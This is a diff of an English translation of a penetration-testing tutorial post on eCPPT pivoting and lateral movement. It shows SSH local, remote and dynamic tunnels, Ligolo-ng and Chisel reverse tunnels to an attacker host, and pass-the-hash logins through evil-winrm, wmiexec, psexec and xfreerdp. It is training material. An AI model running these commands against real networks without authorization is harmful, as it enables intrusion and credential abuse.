@@ -3,7 +3,7 @@ title: "eCPPT Deep-Dive: Part 6 - Lateral Movement, Pivoting & Network Port Forw
 date: 2026-11-12 13:00:00 +0300
 categories: [Cyber Security, Penetration Testing]
 tags: [ecppt, pivoting, lateral-movement, port-forwarding, ssh-tunneling, chisel, ligolo-ng, proxychains]
-description: "الدليل الشامل للجزء السادس من مسار eCPPT: هندسة القفز الشبكي (Pivoting)، أنفاق SSH المتقدمة (-L / -R / -D)، استخدام Chisel و Ligolo-ng، وتقنيات الحركة الجانبية عبر WMIExec و PsExec و Evil-WinRM."
+description: "An exhaustive technical breakdown of Part 6 of the eCPPT curriculum: multi-tier enterprise network pivoting, SSH local/remote/dynamic tunneling, high-speed Layer-3 routing with Ligolo-ng, Chisel HTTP/WebSockets proxies, and Windows lateral movement via Evil-WinRM, WMIExec, and PsExec."
 image:
   path: /assets/images/posts/ecppt/part-6-cover.png
   alt: "eCPPT Masterclass Part 6 - Lateral Movement, Pivoting & Network Port Forwarding"
@@ -14,108 +14,109 @@ schema:
   author: Abdulrahman M. Fathi
 ---
 
-في معظم اختبارات الاختراق الواقعية، وفي بيئة امتحان شهادة **eCPPT** تحديدًا، لا يقع الخادم المستهدف أو خادم قاعدة البيانات الحساسة على شبكة مكشوفة للإنترنت. بل يتم عزل البنية التحتية خلف جدران نارية صارمة وتقسيم شبكي متعدد الطبقات (Network Segmentation & DMZ).
+In real-world enterprise penetration tests and specifically within the **eCPPT (eLearnSecurity Certified Professional Penetration Tester)** practical exam, target database servers, Active Directory domain controllers, and internal file repositories are never directly exposed to the internet. Instead, they reside behind strict stateful firewalls and deeply segmented network layers (DMZs, corporate subnets, and isolated database enclaves).
 
-هنا تبرز المهارة الحاسمة الأكثر أهمية لاجتياز اختبار eCPPT: **القفز الشبكي والتوجيه (Pivoting & Port Forwarding)**. في هذا الجزء، سنفكك المنهجية الكاملة لتحويل أي جهاز مخترق يمتلك واجهتي شبكة (Dual-Homed Host) إلى جسر عبور يتيح لنا مهاجمة واستكشاف الشبكات الداخلية المعزولة وكأننا متصلون بها سلكيًا!
+To compromise an entire network, a penetration tester must master **Pivoting, Port Forwarding, and Lateral Movement**. In this deep dive, we explore how to transform a single dual-homed host into a high-performance routing bridge, compare traditional SSH tunnels with modern Layer-3 routing via **Ligolo-ng**, and execute lateral movement using native Windows administration protocols.
 
 ---
 
-### جدول التنقل في السلسلة (Series Navigation)
+### Series Navigation
 
-| **المقال السابق** | **المقال الحالي** | **المقال القادم** |
+| **Previous Part** | **Current Part** | **Next Part** |
 | :---: | :---: | :---: |
-| [الجزء 5: تصعيد الصلاحيات على Windows و Linux](/posts/ecppt-v3-part-5-privilege-escalation-playbook/) | **الجزء 6: الحركة الجانبية والقفز الشبكي (Pivoting)** | [الجزء 7: خوادم القيادة والتحكم (C2 Frameworks)](/posts/ecppt-v3-part-7-command-and-control-c2/) |
+| [Part 5: Windows & Linux Privilege Escalation](/posts/ecppt-v3-part-5-privilege-escalation-playbook/) | **Part 6: Lateral Movement & Pivoting** | [Part 7: Command and Control (C2) Infrastructure](/posts/ecppt-v3-part-7-command-and-control-c2/) |
 
 ---
 
-## أبرز النقاط الرئيسية (Key Takeaways)
+## Key Takeaways
 
-* **سيناريو الجهاز ثنائي الواجهات (Dual-Homed Pivot)**: عند اختراق خادم في المنطقة منزوعة السلاح (DMZ) يمتلك واجهة شبكة عامة (10.10.10.x) وواجهة داخلية أخرى (172.16.1.x)، يصبح هذا الخادم نقطة ارتكاز (Pivot) للوصول إلى الشبكات الخلفية المعزولة.
-* **أنفاق SSH الثلاثية الأساسية**:
-  * **التوجيه المحلي (`-L`)**: لفتح منفذ محلي على جهاز المهاجم والاتصال بخدمة داخلية على شبكة الضحية.
-  * **التوجيه البعيد (`-R`)**: لفتح منفذ على جهاز الضحية وتوجيهه إلى أداة أو مستمع (Listener) على جهاز المهاجم.
-  * **التوجيه الديناميكي (`-D`)**: لإنشاء وكيل SOCKS4/5 كامل وتوجيه كافة أدوات الفحص عبر `proxychains`.
-* **ثورة Ligolo-ng في التوجيه الشبكي**: بدلاً من المعاناة مع بطء واختناقات `proxychains` وسقوط أدوات مثل Nmap، تتيح أداة **Ligolo-ng** إنشاء واجهة افتراضية كاملة (TUN Interface) على جهاز المهاجم، مما يسمح بتشغيل كافة أدوات الفحص والأوامر ضد الـ Subnet الداخلي مباشرة كأنه متصل محليًا!
-* **بروتوكولات الحركة الجانبية (Lateral Movement Protocols)**: استخدام بروتوكولات الإدارة الشرعية في ويندوز مثل **WinRM** (منفذ 5985/5986)، **WMI** (منفذ 135)، و **SMB** (منفذ 445) للتحرك أفقيًا بين الأجهزة دون تنبيه أنظمة مكافحة الفيروسات.
+* **The Dual-Homed Pivot Concept**: When a host possesses two network interface cards (NICs)—one connected to the internet/DMZ and another to an internal subnet—it acts as an architectural pivot point, allowing an attacker to route packets into non-routable private networks.
+* **The SSH Port Forwarding Trifecta**:
+  * **Local Port Forwarding (`-L`)**: Binds a local port on the attacker's machine and routes traffic through the pivot host to a specific internal IP and port.
+  * **Remote Port Forwarding (`-R`)**: Binds a port on the pivot host and directs incoming traffic backward through the SSH tunnel to a listener on the attacker's machine (essential for reverse shells).
+  * **Dynamic Port Forwarding (`-D`)**: Turns the pivot host into a dynamic SOCKS4/5 proxy, allowing arbitrary multi-port scanning via `proxychains`.
+* **Layer-3 Pivoting with Ligolo-ng**: Traditional SOCKS proxies via `proxychains` suffer from high latency, broken UDP/ICMP traffic, and unstable Nmap scans. **Ligolo-ng** creates a virtual TUN interface on the attacker's operating system, enabling direct subnet routing via `ip route` without requiring `proxychains`.
+* **Chisel HTTP/WebSockets Tunneling**: Bypasses restrictive outbound firewalls by encapsulating SOCKS5 proxy tunnels entirely within standard HTTP/HTTPS headers and WebSockets streams.
+* **Native Windows Lateral Movement Protocols**: Transitioning between machines using legitimate administrative management channels: **WinRM** (port 5985/5986), **WMI** (ports 135/445), **SMB** (port 445), and **RDP** with Pass-the-Hash.
 
 ---
 
-## 1. طوبولوجيا الشبكة متعددة الطبقات (Enterprise Multi-Tier Topology)
+## 1. Enterprise Multi-Tier Pivoting Topology
 
-يوضح المخطط التالي السيناريو النموذجي لاختبار eCPPT، حيث يقبع بنك البيانات في أعمق طبقة معزولة:
+The following diagram illustrates the standard multi-tier architecture encountered in advanced penetration tests:
 
 ```mermaid
 flowchart LR
-    Attacker["جهاز المهاجم<br/>(Kali Linux: 10.10.14.5)"]
-    Firewall1["الجدار الناري الخارجي<br/>(Firewall 1)"]
-    DMZ["خادم الويب في الـ DMZ<br/>NIC1: 10.10.10.50<br/>NIC2: 172.16.1.10 (Pivot 1)"]
-    Firewall2["الجدار الناري الداخلي<br/>(Firewall 2)"]
-    InternalServer["خادم التطبيقات الداخلي<br/>NIC1: 172.16.1.20<br/>NIC2: 192.168.100.5 (Pivot 2)"]
-    Firewall3["جدار حماية قواعد البيانات<br/>(Firewall 3)"]
-    DBServer[("خادم قاعدة البيانات المعزول<br/>IP: 192.168.100.50")]
+    Attacker["Kali Linux Attacker<br/>(10.10.14.5)"]
+    Firewall1["Perimeter Firewall"]
+    DMZ["Compromised Web Server<br/>NIC 1: 10.10.10.50 (Public/DMZ)<br/>NIC 2: 172.16.1.10 (Internal) [Pivot 1]"]
+    Firewall2["Internal Segmentation Firewall"]
+    InternalServer["Compromised App Server<br/>NIC 1: 172.16.1.20<br/>NIC 2: 192.168.100.5 (Enclave) [Pivot 2]"]
+    Firewall3["Database Enclave Firewall"]
+    DBServer[("Isolated Core Database<br/>IP: 192.168.100.50 (Port 3306)")]
 
-    Attacker -->|اتصال مباشر| Firewall1
+    Attacker -->|Direct Attack| Firewall1
     Firewall1 --> DMZ
-    DMZ -->|نفق نفق Pivot 1| Firewall2
+    DMZ -->|Pivot 1 Tunnel| Firewall2
     Firewall2 --> InternalServer
-    InternalServer -->|نفق مزدوج Double Pivot 2| Firewall3
+    InternalServer -->|Pivot 2 Double-Pivot| Firewall3
     Firewall3 --> DBServer
 ```
 
 ---
 
-## 2. احتراف أنفاق SSH (SSH Port Forwarding Deep-Dive)
+## 2. SSH Port Forwarding Deep-Dive
 
-إذا امتلكنا صلاحيات وصول أو حساب SSH على خادم الـ DMZ (Pivot 1):
+If valid credentials or an SSH private key are recovered for the pivot machine:
 
 ```mermaid
 flowchart TD
     subgraph LocalForward ["1. Local Port Forwarding (ssh -L)"]
         direction LR
-        L_Attacker["المهاجم: 127.0.0.1:8080"] -->|نفق مشفر| L_Pivot["خادم Pivot"] -->|اتصال عادي| L_Target["الهدف الداخلي: 172.16.1.50:80"]
+        L_Attacker["Attacker: 127.0.0.1:8080"] -->|Encrypted SSH Tunnel| L_Pivot["Pivot Host: 10.10.10.50"] -->|Internal TCP| L_Target["Internal Target: 172.16.1.50:80"]
     end
     
     subgraph RemoteForward ["2. Remote Port Forwarding (ssh -R)"]
         direction LR
-        R_Target["محطة الضحية الداخلية"] -->|اتصال بالمنفذ 4444| R_Pivot["خادم Pivot: المنفذ 4444"] -->|إعادة توجيه داخل النفق| R_Attacker["مستمع المهاجم: 10.10.14.5:4444"]
+        R_Target["Internal Workstation"] -->|Connects to Port 4444| R_Pivot["Pivot Host: 172.16.1.10:4444"] -->|Traverses Reverse Tunnel| R_Attacker["Attacker Listener: 10.10.14.5:4444"]
     end
     
     subgraph DynamicForward ["3. Dynamic SOCKS Proxy (ssh -D)"]
         direction LR
-        D_Tools["أدوات الفحص (Proxychains)"] -->|SOCKS5 Proxy| D_Attacker["127.0.0.1:9050"] -->|نفق ديناميكي| D_Pivot["خادم Pivot"] -->|استكشاف أي IP وأي منفذ| D_Net["الشبكة الداخلية بأكملها 172.16.1.0/24"]
+        D_Tools["Security Tools (proxychains)"] -->|SOCKS5 Proxy Protocol| D_Attacker["127.0.0.1:9050"] -->|Dynamic SSH Stream| D_Pivot["Pivot Host"] -->|Direct Communication| D_Net["Entire 172.16.1.0/24 Subnet"]
     end
 ```
 
-### الأوامر التكتيكية لأنفاق SSH:
+### Tactical Commands for SSH Tunneling:
 
-#### 1. التوجيه المحلي (Local Port Forwarding):
-للوصول إلى واجهة ويب خادم داخلي (172.16.1.50:80) عبر متصفح جهاز المهاجم:
+#### 1. Local Port Forwarding:
+Exposing an internal database (172.16.1.50:3306) onto the attacker's localhost at port 3306:
 ```bash
-ssh -N -f -L 8080:172.16.1.50:80 user@10.10.10.50
-# الآن نفتح في المتصفح: http://127.0.0.1:8080
+ssh -N -f -L 3306:172.16.1.50:3306 user@10.10.10.50
+# Now connect locally:
+mysql -u root -p -h 127.0.0.1 -P 3306
 ```
 
-#### 2. التوجيه البعيد (Remote Port Forwarding):
-عندما نكون بصدد استغلال جهاز في الشبكة المعزولة ويحتاج الـ Reverse Shell للرجوع لجهاز المهاجم:
+#### 2. Remote Port Forwarding:
+Receiving a reverse shell from an isolated machine that cannot route directly to the internet:
 ```bash
-# على جهاز الـ Pivot: نفتح منفذ 4444 ونوجهه لجهاز المهاجم 10.10.14.5
+# On the pivot host, open port 4444 and forward connections back to Kali (10.10.14.5:4444):
 ssh -N -f -R 4444:10.10.14.5:4444 attacker@10.10.14.5
 ```
 
-#### 3. التوجيه الديناميكي مع Proxychains (Dynamic SOCKS5):
+#### 3. Dynamic SOCKS Proxying via Proxychains:
 ```bash
 ssh -N -f -D 9050 user@10.10.10.50
 ```
 
-نقوم بضبط ملف إعدادات الوكيل `/etc/proxychains4.conf`:
+Configure `/etc/proxychains4.conf`:
 ```text
-# في نهاية الملف:
+# Ensure dynamic_chain is active and specify the SOCKS port at the bottom:
 socks5 127.0.0.1 9050
-# تفعيل proxy_dns لمنع تسريب استعلامات النطاق:
 proxy_dns
 ```
 
-الآن يمكن تشغيل أي أداة عبر الوكيل:
+Execute tools through the dynamic proxy:
 ```bash
 proxychains nmap -sT -Pn -p 22,80,445 172.16.1.50
 proxychains crackmapexec smb 172.16.1.0/24
@@ -123,108 +124,110 @@ proxychains crackmapexec smb 172.16.1.0/24
 
 ---
 
-## 3. القفز الشبكي الحديث فائق السرعة عبر Ligolo-ng
+## 3. High-Speed Layer-3 Pivoting with Ligolo-ng
 
-رغم قوة SOCKS و Proxychains، إلا أنهما يعانيان من عيوب قاتلة: بطء شديد، عدم دعم حزم ICMP / UDP بشكل صحيح، وسقوط جلسات Nmap المتزامنة. أداة **Ligolo-ng** المبنية بلغة Go حلت هذه المشكلة جذريًا عبر إنشاء واجهة TUN برمجية (Layer 3 Routing).
+**Ligolo-ng** replaces slow, fragile SOCKS proxies by creating a virtual Layer-3 network interface (`TUN`) on the attacker's operating system. Once an agent connects, the attacker adds native OS routes to the remote subnet:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Attacker as جهاز كالي لينكس (Ligolo Proxy)
-    participant TUN as واجهة TUN (ligolo)
-    actor Pivot as الخادم المخترق (Ligolo Agent)
-    participant Internal as الشبكة الداخلية المعزولة (172.16.1.0/24)
+    actor Attacker as Kali Attacker (Ligolo Proxy)
+    participant TUN as Virtual TUN Device (ligolo)
+    actor Pivot as Compromised Pivot Host (Ligolo Agent)
+    participant Internal as Internal Subnet (172.16.1.0/24)
     
-    Attacker->>TUN: إعداد واجهة شبكة افتراضية: sudo ip tuntap add mode tun ligolo
-    Attacker->>Attacker: تشغيل خادم Ligolo: ./proxy -selfcert -laddr 0.0.0.0:11601
-    Pivot->>Attacker: تشغيل العميل: ./agent -connect 10.10.14.5:11601 -ignore-cert
-    Attacker->>Pivot: جلسة متصلة! اختيار العميل وبدء النفق: session -> start
-    Attacker->>TUN: إضافة مسار توجيه نظامي للشبكة المعزولة:<br/>sudo ip route add 172.16.1.0/24 dev ligolo
-    Note over Attacker,Internal: الآن يمكن عمل Ping وفحص SYN وفحص Nmap دون الحاجة لـ Proxychains نهائيًا!
+    Attacker->>TUN: Configure TUN interface: sudo ip tuntap add mode tun ligolo
+    Attacker->>Attacker: Launch Ligolo Proxy server: ./proxy -selfcert -laddr 0.0.0.0:11601
+    Pivot->>Attacker: Execute Agent: ./agent -connect 10.10.14.5:11601 -ignore-cert
+    Attacker->>Pivot: Session established! Select agent and initiate tunnel: session -> start
+    Attacker->>TUN: Add system route: sudo ip route add 172.16.1.0/24 dev ligolo
+    Note over Attacker,Internal: Entire subnet is now natively routable! Nmap SYN scans and ping work seamlessly.
 ```
 
-### خطوات تشغيل Ligolo-ng الميدانية:
+### Ligolo-ng Execution Steps:
 
-#### 1. على جهاز المهاجم (Kali Linux):
+#### 1. On the Attacker Machine (Kali Linux):
 ```bash
-# إنشاء وتفعيل واجهة TUN
+# Create and activate the TUN device
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 
-# تشغيل خادم البروكسي
+# Start the Ligolo proxy listening on port 11601
 ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-#### 2. على الجهاز المخترق (Pivot Host):
+#### 2. On the Compromised Pivot Host:
 ```cmd
-# على خادم ويندوز أو لينكس:
+# Windows target:
 agent.exe -connect 10.10.14.5:11601 -ignore-cert
+
+# Linux target:
+./agent -connect 10.10.14.5:11601 -ignore-cert
 ```
 
-#### 3. تفعيل التوجيه على جهاز المهاجم:
-في واجهة Ligolo التفاعلية:
+#### 3. Activating the Tunnel:
+Inside the interactive Ligolo proxy shell:
 ```text
 ligolo-ng » session
-[1] User@PIVOT-PC
+[1] User@PIVOT-HOST - 10.10.10.50
 ligolo-ng » start
 [+] Starting tunnel to agent...
 ```
 
-ثم من نافذة Terminal أخرى على Kali:
+From another terminal on Kali, add the route:
 ```bash
-# توجيه شبكة 172.16.1.0/24 عبر واجهة ligolo
 sudo ip route add 172.16.1.0/24 dev ligolo
 
-# الآن يمكنك فحص واستهداف الشبكة مباشرة وبسرعة فائقة:
+# Verify native routing without proxychains:
 ping 172.16.1.50
-nmap -sS -Pn 172.16.1.0/24
+nmap -sS -Pn -p 80,445,3389 172.16.1.0/24
 ```
 
 ---
 
-## 4. أنفاق Chisel عبر بروتوكول HTTP/WebSockets
+## 4. Chisel: HTTP/WebSockets Reverse Tunnels
 
-إذا كان الجدار الناري يحظر كافة المنافذ الصادرة باستثناء منفذ تصفح الويب (Port 80 أو 443)، فإن أداة **Chisel** تضمن لك تمرير نفق TCP كامل مشفر ومغلف داخل ترويسات بروتوكول HTTP/WebSockets لتخطي فحص الجدران النارية:
+When outbound traffic is strictly restricted to web inspection ports (TCP 80 and 443), **Chisel** encapsulates full TCP/SOCKS traffic inside clean HTTP/WebSockets streams:
 
 ```bash
-# 1. على جهاز المهاجم: تشغيل خادم Chisel مع نفق عكسي
+# 1. On Kali: Start the Chisel server in reverse mode
 chisel server --reverse --port 8000
 
-# 2. على خادم الضحية (Pivot): الاتصال بالخادم وفتح وكيل SOCKS5
+# 2. On the pivot target: Connect back to Kali and request a reverse SOCKS proxy
 chisel client 10.10.14.5:8000 R:1080:socks
 ```
 
-الآن يُفتح وكيل SOCKS5 على المنفذ `1080` في جهاز كالي، ويمكن توجيه حركة المرور فورًا!
+This immediately establishes a SOCKS5 proxy on `127.0.0.1:1080` on Kali Linux!
 
 ---
 
-## 5. تقنيات الحركة الجانبية في بيئات ويندوز (Lateral Movement Playbook)
+## 5. Windows Lateral Movement Playbook
 
-بمجرد فتح النفق إلى الشبكة الداخلية، نبدأ باستهداف الأجهزة المجاورة باستخدام بيانات الاعتماد التي جمعناها سابقًا:
+Once the network tunnel is established, we laterally move to adjacent domain systems using harvested credentials:
 
-### 1. عبر Evil-WinRM (منفذ 5985 HTTP / 5986 HTTPS)
-يعد الخيار الأكثر تفضيلاً لأنه يستغل خدمة إدارة ويندوز عن بعد (WinRM)، ولا يولد عمليات غريبة ترصدها أنظمة EDR، ويوفر Shell باورشيل حقيقي:
+### 1. Evil-WinRM (Port 5985 HTTP / 5986 HTTPS)
+Windows Remote Management (WinRM) is the standard administration protocol for Windows systems. It executes commands natively without triggering typical EDR service-creation alerts:
 
 ```bash
 evil-winrm -i 172.16.1.50 -u Administrator -H 7fc07bbe74664a7726da442b439aa4b5
 ```
 
-### 2. عبر Impacket WMIExec (منفذ 135 RPC / 445 SMB)
-يتميز WMI بأنه لا ينشئ خدمة جديدة على الجهاز الضحية، بل يستدعي أسلوب `Win32_Process.Create` لتنفيذ الأمر بصمت تام:
+### 2. Impacket WMIExec (Ports 135 RPC / 445 SMB)
+WMIExec is agentless and highly stealthy; it does not register a new Windows service. Instead, it invokes the `Win32_Process.Create` method over DCOM:
 
 ```bash
 wmiexec.py -hashes :7fc07bbe74664a7726da442b439aa4b5 Administrator@172.16.1.50 "whoami && ipconfig"
 ```
 
-### 3. عبر Impacket PsExec (منفذ 445 SMB)
-يقوم بإنشاء خدمة مؤقتة (`PSEXESVC`) لرفع الصلاحيات مباشرة إلى `NT AUTHORITY\SYSTEM`:
+### 3. Impacket PsExec (Port 445 SMB)
+Uploads an administrative executable, creates a transient service (`PSEXESVC`), and returns an immediate interactive shell with `NT AUTHORITY\SYSTEM` privileges:
 
 ```bash
 psexec.py -hashes :7fc07bbe74664a7726da442b439aa4b5 Administrator@172.16.1.50
 ```
 
-### 4. عبر بروتوكول سطح المكتب البعيد RDP مع Pass-the-Hash
-إذا كانت سياسة النطاق تسمح بخاصية Restricted Admin Mode، يمكن الدخول لواجهة سطح المكتب الرسومية باستخدام الهاش دون الحاجة لكلمة المرور الصريحة:
+### 4. Remote Desktop Protocol (RDP) with Pass-the-Hash
+When Restricted Admin Mode is enabled, operators can establish full GUI sessions using NTLM hashes:
 
 ```bash
 xfreerdp /v:172.16.1.50 /u:Administrator /pth:7fc07bbe74664a7726da442b439aa4b5 /cert:ignore
@@ -232,15 +235,15 @@ xfreerdp /v:172.16.1.50 /u:Administrator /pth:7fc07bbe74664a7726da442b439aa4b5 /
 
 ---
 
-## المراجع والمصادر الخارجية (References & Further Reading)
+## References & Further Reading
 
-1. **Ligolo-ng High-Performance Pivoting Repository**: [https://github.com/nico-cha/ligolo-ng](https://github.com/nico-cha/ligolo-ng)
-2. **Chisel: Fast TCP/UDP Tunnel over HTTP by Jaime Pillora**: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
-3. **Evil-WinRM: The Ultimate WinRM Shell by Hackplayers**: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+1. **Ligolo-ng Repository & Documentation**: [https://github.com/nico-cha/ligolo-ng](https://github.com/nico-cha/ligolo-ng)
+2. **Chisel: Fast TCP/UDP Tunnel over HTTP** by Jaime Pillora: [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+3. **Evil-WinRM: The Ultimate WinRM Shell**: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
 4. **RFC 4251: The Secure Shell (SSH) Protocol Architecture**.
 5. **MITRE ATT&CK Matrix**:
    * Technique T1090: Proxy (Multi-hop Proxies, External/Internal Proxies)
-   * Technique T1021: Remote Services (SMB/Windows Admin Shares, WinRM, RDP)
+   * Technique T1021: Remote Services (SMB, WinRM, RDP)
 
 ---
 
